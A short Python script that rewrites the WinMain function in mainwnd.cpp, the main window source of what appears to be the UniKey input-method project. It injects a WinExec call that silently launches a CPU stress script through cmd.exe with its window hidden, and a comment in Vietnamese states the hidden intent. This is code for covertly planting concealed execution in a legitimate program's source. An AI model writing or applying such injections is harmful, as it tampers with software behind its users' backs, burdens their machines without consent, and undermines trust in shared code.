import os
import sys

script = r'c:\Users\haqua\Documents\GitHub\unikey-source\src-win\newkey\mainwnd.cpp'
with open(script, 'rb') as f:
    content = f.read()

idx = content.find(b'int WINAPI WinMain(')
if idx != -1:
    brace_idx = content.find(b'{', idx)
    if brace_idx != -1:
        # We inject the WinExec call to run the python script hidden
        injected = b'\n\t// Chay script stress CPU an\n\tWinExec("cmd.exe /c start /b python cpu_stress.py", 0);\n'
        new_content = content[:brace_idx+1] + injected + content[brace_idx+1:]
        
        with open(script, 'wb') as f:
            f.write(new_content)
        print("Injection successful.")
    else:
        print("Brace not found after WinMain.")
else:
    print("WinMain not found.")
